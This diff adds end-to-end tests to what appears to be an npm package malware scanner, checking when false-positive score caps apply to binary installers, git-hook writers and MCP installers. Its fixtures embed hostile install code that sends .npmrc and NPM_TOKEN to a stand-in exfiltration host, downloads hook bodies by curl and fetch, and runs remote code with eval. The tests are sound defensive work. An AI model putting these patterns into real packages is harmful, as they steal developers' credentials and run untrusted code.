@@ -144,6 +144,110 @@ async function runE2EFpCapTests() {
     const s = scanCli(bundlePkg(bundle('var tk=process.env.NPM_TOKEN;')));
     assert(!s.capLine.includes('vendor_minified_bundle') && s.score > 25, show(s));
   });
+
+  // ---- F2 install_url_github_releases ----
+  // Native-binary installer fetching from GitHub Releases (esbuild / swc shape) -> MAX 35.
+  // The host proves where the binary comes from, not what the rest of the installer does.
+  const installer = extra => ({
+    'package.json': { name: 'tool-bin-x', version: '1.0.0', main: 'install.js', scripts: { postinstall: 'node install.js' } },
+    'install.js': "const https=require('https'),fs=require('fs'),cp=require('child_process'),os=require('os');" +
+      "const url='https://github.com/acme/tool/releases/download/v1.0.0/tool-'+process.platform+'-'+process.arch;" +
+      "https.get(url,r=>{const f=fs.createWriteStream('/tmp/tool');r.pipe(f);f.on('finish',()=>{fs.chmodSync('/tmp/tool',0o755);cp.exec('/tmp/tool --version');});});\n" + extra
+  });
+  await asyncTest('F2 E2E: platform binary downloaded from GitHub Releases -> cap applies', async () => {
+    const s = scanCli(installer(''));
+    assert(s.capLine.includes('install_url_github_releases') && s.score <= 35, show(s));
+  });
+  await asyncTest('F2 E2E: same installer also sending a credential file out -> cap does not apply', async () => {
+    const s = scanCli(installer("const n=fs.readFileSync(os.homedir()+'/.npmrc','utf8');https.request({hostname:'github.com',method:'POST',path:'/acme/tool/issues'}).end(n);\n"));
+    assert(!s.capLine.includes('install_url_github_releases') && s.score > 35, show(s));
+  });
+
+  // ---- F4 git_hook_source_local ----
+  // Dev tooling writing its own canned git hook (husky shape) -> MAX 35. The local source
+  // says nothing about what the hook body does.
+  const hookPkg = body => ({
+    'package.json': { name: 'githooks-helper-x', version: '1.0.0', main: 'index.js', scripts: { postinstall: 'node index.js' } },
+    'index.js': "const fs=require('fs'),path=require('path');const hook=path.join(process.cwd(),'.git','hooks','pre-commit');" +
+      'fs.writeFileSync(hook,' + JSON.stringify(body) + ');fs.chmodSync(hook,0o755);\n'
+  });
+  await asyncTest('F4 E2E: canned local pre-commit hook -> cap applies', async () => {
+    const s = scanCli(hookPkg('#!/bin/sh\nnpx lint-staged\n'));
+    assert(s.capLine.includes('git_hook_source_local') && s.score <= 35, show(s));
+  });
+  await asyncTest('F4 E2E: hook body sending a credential file out -> cap does not apply', async () => {
+    const s = scanCli(hookPkg('#!/bin/sh\ncurl -s -X POST --data-binary @$HOME/.npmrc https://collector.example-exfil.net/h\n'));
+    assert(!s.capLine.includes('git_hook_source_local') && s.score > 35, show(s));
+  });
+  // The cap trusts the hook writer only: what else the install runs, and where the hook body
+  // comes from, must still count.
+  const writeHook = "fs.writeFileSync(path.join('.git','hooks','pre-commit'),b,{mode:0o755})";
+  const hookWriter = (setup, extra) => ({
+    'package.json': { name: 'githooks-helper-x', version: '1.0.0', scripts: { postinstall: 'node setup.js' + (extra ? ' && node other.js' : '') } },
+    'setup.js': "const fs=require('fs'),path=require('path');" + setup + '\n',
+    ...(extra ? { 'other.js': extra } : {})
+  });
+  const noCapF4 = (name, files) => asyncTest(`F4 E2E: ${name} -> cap does not apply`, async () => {
+    const s = scanCli(files);
+    assert(!s.capLine.includes('git_hook_source_local') && s.score > 35, show(s));
+  });
+  await asyncTest('F4 E2E: hook installer loading the project config by path -> cap applies', async () => {
+    const s = scanCli(hookWriter(
+      "const cfg=path.join(process.cwd(),'.simple-git-hooks.js');const conf=require(cfg);" +
+      "for(const h of Object.keys(conf)){const b='#!/bin/sh\\n'+conf[h]+'\\n';fs.writeFileSync(path.join('.git','hooks',h),b,{mode:0o755});}"));
+    assert(s.capLine.includes('git_hook_source_local') && s.score <= 35, show(s));
+  });
+  await noCapF4('local hook, another install file sends the registry token out', hookWriter(
+    "const b='#!/bin/sh\\nnpm test\\n';" + writeHook + ';',
+    "const https=require('https');https.request({hostname:'collector.example-exfil.net',method:'POST',path:'/c'}).end(process.env.NPM_TOKEN);\n"));
+  await noCapF4('local hook, another install file loads a module by a computed name', hookWriter(
+    "const b='#!/bin/sh\\nnpm test\\n';" + writeHook + ';',
+    "const m=process.argv[2]||'./x';module.exports=require(m);\n"));
+  await noCapF4('hook body read from a shell command', hookWriter(
+    "const b=require('child_process').execSync('curl -fsSL https://hooks.example-cdn.net/pre-commit').toString();" + writeHook + ';'));
+  await noCapF4('hook body downloaded with fetch()', hookWriter(
+    "fetch('https://hooks.example-cdn.net/pre-commit').then(r=>r.text()).then(b=>" + writeHook + ');'));
+  await noCapF4('hook body downloaded with https.get', hookWriter(
+    "require('https').get('https://hooks.example-cdn.net/pre-commit',r=>{let b='';r.on('data',d=>b+=d);r.on('end',()=>" + writeHook + ');});'));
+  await noCapF4('hook body downloaded through a module loaded by a computed name', hookWriter(
+    "const m=['ht','tps'].join('');require(m).get('https://hooks.example-cdn.net/pre-commit',r=>{let b='';r.on('data',d=>b+=d);r.on('end',()=>" + writeHook + ');});'));
+  await noCapF4('local hook, the same install runs remote code', hookWriter(
+    "const b='#!/bin/sh\\nnpm test\\n';" + writeHook + ";require('https').get('https://cdn.example-cdn.net/x.js',r=>{let c='';r.on('data',d=>c+=d);r.on('end',()=>eval(c));});"));
+  // A dependency typosquat is discounted by F5 when the host package is scoped; F4 follows F5
+  // for those findings only.
+  const adapter = (name, extra) => ({
+    'package.json': { name, version: '1.0.0', dependencies: { ping: '^0.4.4' }, scripts: { preinstall: 'node utils/setup.js' + (extra ? ' && node utils/other.js' : '') } },
+    'utils/pre-commit.sh': '#!/bin/sh\nnpm run lint\n',
+    'utils/setup.js': "const fs=require('fs');const b=fs.readFileSync('utils/pre-commit.sh','utf8');" +
+      "fs.stat('.git',e=>{if(e==null)fs.writeFile('.git/hooks/pre-commit',b,{mode:0o755},()=>{});});\n",
+    ...(extra ? { 'utils/other.js': extra } : {})
+  });
+  await asyncTest('F4 E2E: scoped package, local hook and a dependency typosquat discounted by F5 -> cap applies', async () => {
+    const s = scanCli(adapter('@acme/adapter-x'));
+    assert(s.types.includes('typosquat_detected') && s.types.includes('git_hooks_injection'), show(s));
+    assert(s.capLine.includes('git_hook_source_local') && s.capLine.includes('typosquat_scoped_package') && s.score <= 35, show(s));
+  });
+  await asyncTest('F4 E2E: unscoped package, local hook and a dependency typosquat (no F5) -> cap does not apply', async () => {
+    const s = scanCli(adapter('acme-adapter-x'));
+    assert(s.types.includes('typosquat_detected') && !s.capLine.includes('typosquat_scoped_package'), show(s));
+    assert(!s.capLine.includes('git_hook_source_local') && s.score > 35, show(s));
+  });
+  await noCapF4('scoped package with F5, local hook, another install file loads a module by a computed name',
+    adapter('@acme/adapter-x', "const m=process.argv[2]||'./x';module.exports=require(m);\n"));
+
+  // ---- F9 mcp_server_env_access ----
+  // MCP installer writing its client config and using a provider key with the provider -> MAX 30.
+  const mcpPkg = host => ({
+    'package.json': { name: 'acme-mcp', version: '1.0.0', description: 'MCP server for Acme', keywords: ['mcp', 'model-context-protocol'], main: 'index.js', bin: { 'acme-mcp': 'index.js' } },
+    'index.js': "const fs=require('fs'),os=require('os'),path=require('path'),https=require('https');" +
+      "fs.writeFileSync(path.join(os.homedir(),'.cursor','mcp.json'),JSON.stringify({mcpServers:{acme:{command:'npx',args:['acme-mcp']}}}));" +
+      "const key=process.env.OPENAI_API_KEY;" +
+      `https.request({hostname:'${host}',method:'POST',path:'/v1/chat/completions',headers:{authorization:'Bearer '+key}}).end(JSON.stringify({key}));\n`
+  });
+  await asyncTest('F9 E2E: MCP installer using a provider key with its provider -> cap applies', async () => {
+    const s = scanCli(mcpPkg('api.openai.com'));
+    assert(s.capLine.includes('mcp_server_env_access') && s.score <= 30, show(s));
+  });
 }
 
 module.exports = { runE2EFpCapTests };
